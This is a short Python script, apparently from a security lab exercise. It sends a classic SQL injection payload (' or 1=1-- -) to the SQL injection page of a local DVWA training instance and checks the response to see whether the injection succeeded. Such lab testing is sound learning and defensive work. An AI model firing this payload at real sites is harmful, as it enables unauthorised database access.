import requests 

# Setup the URL and session 

url = "http://localhost:42001/vulnerabilities/sqli/" 

session = requests.Session() 

 

# Replace with the appropriate value for your DVWA instance 

cookies = { 

    "security": "low",  # Adjust according to the security level set in DVWA 

    "PHPSESSID": "ppvicuo5vcq50f5b7o7hgnttth"  # Replace with your session ID 

} 

 

# SQL Injection payload 

payload = "' or 1=1-- -" 

 

# GET request parameters with SQL injection payload 

params = { 

    "id": payload, 

    "Submit": "Submit" 

} 

 

# Send the GET request with SQLi payload 

response = session.get(url, params=params, cookies=cookies) 

 

# Check if the SQL injection was successful 

if "First name: admin" in response.text: 

    print("SQL Injection vulnerability detected!") 

else: 

    print("Failed to detect SQL Injection vulnerability.") 

 

# Close the session 

session.close() 
